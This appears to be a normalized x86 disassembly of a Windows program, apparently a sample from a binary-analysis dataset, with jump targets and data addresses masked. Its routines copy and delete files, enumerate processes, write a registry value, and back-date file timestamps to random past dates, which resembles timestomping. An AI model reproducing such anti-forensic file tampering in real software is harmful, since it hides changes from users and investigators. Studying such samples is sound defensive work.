mov [ ebp - 0x294 ] edx
mov [ ebp - 0x290 ] ecx
cmp [ ebp - 0x294 ] 0x0
jne r-xdata
push 0x20
push [ ebp - 0x294 ]
call [ SetFileAttributesW@IAT ]
mov [ ebp - 0x28c ] eax
push [ ebp - 0x294 ]
call [ DeleteFileW@IAT ]
mov [ ebp - 0x28c ] eax
cmp [ ebp - 0x28c ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x28c ] 0x0
setne al
movzx eax [ ebp + 0x8 ]
test eax eax
je r-xdata
leave
retn 0x4
push 0x104
push [ ebp - 0x294 ]
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcpynW@IAT ]
and [ ebp - 0x80 ] 0x0
push 0x7
lea edx [ ebp - 0x80 ]
mov ecx [ ebp - 0x290 ]
call sub_413c8f
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push [ ebp - 0x294 ]
call [ MoveFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x288 ]
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x28c ] eax
push [ ebp - 0x294 ]
call [ DeleteFileW@IAT ]
mov [ ebp - 0x28c ] eax
sub_4120dc
push ebp
mov ebp esp
sub esp 0xc8
mov [ ebp - 0xc8 ] edx
mov [ ebp - 0xc4 ] ecx
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x19 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov edx [ ebp - 0xc8 ]
mov ecx [ ebp - 0xc4 ]
call sub_413434
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xc4 ]
call sub_413bfd
push [ ebp + 0xc ]
lea eax [ ebp - 0xa0 ]
push eax
call [ lstrcatW@IAT ]
lea edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xc4 ]
call sub_411ef6
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411ff4
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411ff4
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x1d608e
mov ecx [ ebp - 0xc4 ]
call sub_413729
add eax 0x9cada
xor ecx ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
push 0x2
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411abb
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_417232
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xc4 ]
call sub_411e2c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_417232
and [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_417232
and [ ebp - 0x4 ] 0x0
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xc4 ]
call sub_411c67
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411ff4
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xbc ]
push eax
call [ GetSystemTime@IAT ]
push 0x5
pop edx
mov ecx [ ebp - 0xc4 ]
call sub_413729
dec eax
movsx eax ax
movzx ecx [ ebp - 0xbc ]
sub ecx eax
mov [ ebp - 0xbc ] cx
push 0x6
pop edx
mov ecx [ ebp - 0xc4 ]
call sub_413729
dec eax
mov [ ebp - 0xc0 ] eax
movzx eax [ ebp - 0xba ]
sub eax [ ebp - 0xc0 ]
jns r-xdata
push 0x0
push [ ebp - 0x10 ]
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411a49
push 0x1
lea eax [ ebp - 0x19 ]
push eax
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0xc4 ]
call sub_4119b9
push 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411ff4
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_417232
and [ ebp - 0x4 ] 0x0
movzx eax [ ebp - 0xba ]
sub eax [ ebp - 0xc0 ]
mov [ ebp - 0xba ] ax
push 0xc
pop eax
sub eax [ ebp - 0xc0 ]
movzx ecx [ ebp - 0xba ]
add ecx eax
mov [ ebp - 0xba ] cx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc4 ]
call sub_417232
and [ ebp - 0x4 ] 0x0
movzx eax [ ebp - 0xb6 ]
sub eax [ ebp - 0xc0 ]
mov [ ebp - 0xb6 ] ax
push 0x1e
pop eax
sub eax [ ebp - 0xc0 ]
movzx ecx [ ebp - 0xb6 ]
add ecx eax
mov [ ebp - 0xb6 ] cx
jmp r-xdata
push 0xf
pop edx
mov ecx [ ebp - 0xc4 ]
call sub_413729
dec eax
mov [ ebp - 0xc0 ] eax
movzx eax [ ebp - 0xb6 ]
sub eax [ ebp - 0xc0 ]
jns r-xdata
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xbc ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
push [ ebp - 0xa4 ]
call [ SetFileTime@IAT ]
mov [ ebp - 0xc0 ] eax
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0xc4 ]
call sub_411aa5
jmp r-xdata
sub_412449
push ebp
mov ebp esp
push 0xffffffff
push sub_4238d3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x234
mov [ ebp - 0x240 ] edx
mov [ ebp - 0x23c ] ecx
lea ecx [ ebp - 0x1c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
push 0x1
push 0x104
lea edx [ ebp - 0x234 ]
mov ecx [ ebp - 0x23c ]
call sub_415b6c
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x238 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x238 ]
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x23c ]
call sub_415aba
mov [ ebp - 0x28 ] eax
push 0x1
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x1c ]
call sub_4105e1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x23c ]
call sub_415ad6
movzx eax al
test eax eax
jne r-xdata
push 0x2
lea edx [ ebp - 0x234 ]
mov ecx [ ebp - 0x23c ]
call sub_411abb
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x235 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x235 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x1c ]
call sub_40100f
push eax
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x23c ]
call sub_4119b9
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x23c ]
call sub_411aa5
mov [ ebp - 0x236 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x236 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x28 ]
je r-xdata
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x23c ]
call sub_411aa5
mov edx [ ebp - 0x240 ]
mov ecx [ ebp - 0x23c ]
call sub_411bcd
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x240 ]
lea eax [ ebp - 0x234 ]
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x237 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x237 ]
jmp r-xdata
push 0x1
mov edx [ ebp - 0x240 ]
mov ecx [ ebp - 0x23c ]
call sub_411ff4
sub_412619
push ebp
mov ebp esp
push 0xffffffff
push sub_423b66
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax 0x1215c
call sub_40a0e0
mov [ ebp - 0x12168 ] ecx
mov ecx [ ebp - 0x12168 ]
call sub_413b96
mov [ ebp - 0x12110 ] eax
mov ecx [ ebp - 0x12168 ]
call sub_413b96
mov [ ebp - 0x12158 ] eax
lea ecx [ ebp - 0x12140 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x1211c ]
push eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp - 0x12168 ]
call sub_411c0c
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x12162 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x12162 ]
cmp [ ebp - 0x12118 ] 0x0
ja r-xdata
mov [ ebp - 0x1215d ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x1215d ]
jmp r-xdata
cmp [ ebp - 0x1211c ] 0xffffffff
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x18
mov eax [ ebp - 0x1211c ]
mov ecx [ ebp - 0x12118 ]
and ecx 0x0
mov [ ebp - 0x12120 ] eax
lea eax [ ebp - 0x12120 ]
push eax
push 0x72682c0
lea ecx [ ebp - 0x12140 ]
call sub_4171c5
mov eax [ ebp + 0x14 ]
add eax 0x4
push eax
push 0x6354ec21
lea ecx [ ebp - 0x12140 ]
call sub_4171a8
mov eax [ ebp + 0x14 ]
add eax 0x14
push eax
push 0x6d49ed2e
lea ecx [ ebp - 0x12140 ]
call sub_4171a8
push [ ebp + 0x10 ]
push [ ebp + 0x10 ]
call [ lstrlenW@IAT ]
push eax
push 0x1a2e71c0
lea ecx [ ebp - 0x12140 ]
call sub_417214
push [ ebp + 0x14 ]
push 0x153b88ff
lea ecx [ ebp - 0x12140 ]
call sub_4171c5
lea eax [ ebp - 0x12110 ]
push eax
push 0x1d2b8ef1
lea ecx [ ebp - 0x12140 ]
call sub_4171c5
lea eax [ ebp - 0x12150 ]
push eax
lea ecx [ ebp - 0x12140 ]
call sub_416fc3
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
lea ecx [ ebp - 0x12150 ]
call sub_401000
push eax
push 0x0
push 0x28
push [ ebp - 0x12158 ]
push 0x0
push [ ebp + 0xc ]
lea ecx [ ebp - 0x12150 ]
call sub_401000
push eax
lea ecx [ ebp - 0x12150 ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x12168 ]
call sub_41578c
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x1215e ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x1215e ]
jmp r-xdata
push 0x0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp - 0x12168 ]
call sub_411abb
mov [ ebp - 0x12154 ] eax
cmp [ ebp - 0x12154 ] 0xffffffff
je r-xdata
push [ ebp + 0x1c ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call [ ebp + 0x18 ]
add esp 0x10
movzx eax al
test eax eax
jne r-xdata
and [ ebp - 0x1215c ] 0x0
mov [ ebp - 0x1215f ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x1215f ]
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp - 0x12120 ]
push [ ebp - 0x1215c ]
push 0x28
push [ ebp - 0x12110 ]
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
lea edx [ ebp - 0x1210c ]
mov ecx [ ebp - 0x12168 ]
call sub_41578c
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
ja r-xdata
push [ ebp + 0x1c ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call [ ebp + 0x18 ]
add esp 0x10
movzx eax al
test eax eax
jne r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x1215c ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x1215c ] eax
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x120f8
lea eax [ ebp - 0x1210c ]
push eax
mov edx [ ebp - 0x12154 ]
mov ecx [ ebp - 0x12168 ]
call sub_411a01
mov [ ebp - 0x10 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp - 0x12154 ]
mov ecx [ ebp - 0x12168 ]
call sub_411aa5
mov [ ebp - 0x12161 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x12161 ]
jmp r-xdata
mov edx [ ebp - 0x12154 ]
mov ecx [ ebp - 0x12168 ]
call sub_411aa5
mov [ ebp - 0x12160 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x12150 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x12140 ]
call sub_416bd2
mov al [ ebp - 0x12160 ]
jmp r-xdata
sub_412a07
push ebp
mov ebp esp
sub esp 0x23c
mov [ ebp - 0x23c ] edx
mov [ ebp - 0x238 ] ecx
mov [ ebp - 0x230 ] 0x22c
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x234 ] eax
cmp [ ebp - 0x234 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
push [ ebp - 0x234 ]
call Process32FirstW
test eax eax
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x234 ]
call [ CloseHandle@IAT ]
mov al 0x1
push [ ebp + 0x8 ]
lea eax [ ebp - 0x230 ]
push eax
call [ ebp - 0x23c ]
pop ecx
pop ecx
movzx eax al
cmp eax 0x1
jne r-xdata
leave
retn 0x4
lea eax [ ebp - 0x230 ]
push eax
push [ ebp - 0x234 ]
call Process32NextW
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x230 ]
push eax
call [ ebp - 0x23c ]
pop ecx
pop ecx
movzx eax al
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_412ab7
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push 0x4
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp - 0x8 ]
call sub_4100e9
mov al 0x1
leave
retn
sub_412ae6
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4e7c ] 0x0
jl r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4e7c ] 0x20
jl r-xdata
leave
retn
push 0x118
push [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4e7c ]
imul eax eax 0x118
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax + 0x2b7c ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4e7c ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4e7c ] eax
mov al 0x1
sub_412b5d
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2b78 ] 0x0
jl r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2b78 ] 0x20
jl r-xdata
leave
retn
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x2b78 ]
jge r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x8 ]
cmp ecx [ edx + eax + 0x880 ]
jle r-xdata
mov al 0x1
push 0x118
push [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2b78 ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x878 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2b78 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x2b78 ] eax
jmp r-xdata
push 0x20
pop eax
sub eax [ ebp - 0x8 ]
dec eax
imul eax eax 0x118
push eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x878 ]
push eax
mov eax [ ebp - 0x8 ]
inc eax
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x878 ]
push eax
call sub_4026b0
add esp 0xc
push 0x118
push [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
imul eax eax 0x118
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x878 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2b78 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x2b78 ] eax
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_412c9d
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x504 ] 0x0
jl r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x504 ] 0x20
jl r-xdata
leave
retn
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x504 ]
jge r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x8 ]
cmp ecx [ edx + eax + 0x28c ]
jle r-xdata
mov al 0x1
push 0x14
push [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x504 ]
imul eax eax 0x14
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x284 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x504 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x504 ] eax
jmp r-xdata
push 0x20
pop eax
sub eax [ ebp - 0x8 ]
dec eax
imul eax eax 0x14
push eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x284 ]
push eax
mov eax [ ebp - 0x8 ]
inc eax
imul eax eax 0x14
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x284 ]
push eax
call sub_4026b0
add esp 0xc
push 0x14
push [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x284 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x504 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x504 ] eax
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_412dc5
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x15 ] 0x1
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x78c ] 0x0
jl r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x78c ] 0x20
jl r-xdata
leave
retn
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x78c ]
jge r-xdata
movzx eax [ ebp - 0x15 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
imul eax eax 0x14
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x8 ]
cmp ecx [ edx + eax + 0x514 ]
jl r-xdata
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x20 ] 0x0
jmp r-xdata
push 0x14
push [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x78c ]
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
lea eax [ ecx + eax + 0x50c ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x78c ]
inc eax
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x78c ] eax
jmp r-xdata
push 0x20
pop eax
sub eax [ ebp - 0x10 ]
dec eax
imul eax eax 0x14
push eax
mov eax [ ebp - 0x10 ]
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
lea eax [ ecx + eax + 0x50c ]
push eax
mov eax [ ebp - 0x10 ]
inc eax
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
lea eax [ ecx + eax + 0x50c ]
push eax
call sub_4026b0
add esp 0xc
push 0x14
push [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
lea eax [ ecx + eax + 0x50c ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x78c ]
inc eax
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x78c ] eax
mov [ ebp - 0x15 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x20 ]
cmp ecx [ eax + 0x78c ]
jge r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fdivr [ r--data ]
fstp [ ebp - 0x8 ]
fldz
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
add edx [ ecx + eax + 0x514 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x10 ] 0x0
jmp r-xdata
fld1
fstp [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x78c ]
jge r-xdata
mov al 0x1
and [ ebp - 0xc ] 0x0
jmp r-xdata
fild [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
imul eax eax 0x14
mov ecx [ ebp - 0x24 ]
fild [ ecx + eax + 0x514 ]
fmul [ ebp - 0x8 ]
fcompp
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp - 0x1c ] 0x64
jl r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x1c ]
mov cl [ ebp - 0x10 ]
mov [ eax + 0x790 ] cl
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x64
jl r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
sub_412fb6
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x280 ] 0x0
jl r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x280 ] 0x20
jl r-xdata
leave
retn
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x280 ]
jge r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x8 ]
cmp ecx [ edx + eax + 0x8 ]
jl r-xdata
mov al 0x1
push 0x14
push [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x280 ]
imul eax eax 0x14
add eax [ ebp - 0xc ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x280 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x280 ] eax
jmp r-xdata
push 0x20
pop eax
sub eax [ ebp - 0x8 ]
dec eax
imul eax eax 0x14
push eax
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
add eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
inc eax
imul eax eax 0x14
add eax [ ebp - 0xc ]
push eax
call sub_4026b0
add esp 0xc
push 0x14
push [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
imul eax eax 0x14
add eax [ ebp - 0xc ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x280 ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x280 ] eax
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_4130bb
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
leave
retn
push 0xf0000040
push 0x1
push r--data
push 0x0
push rw-data
call [ CryptAcquireContextW@IAT ]
test eax eax
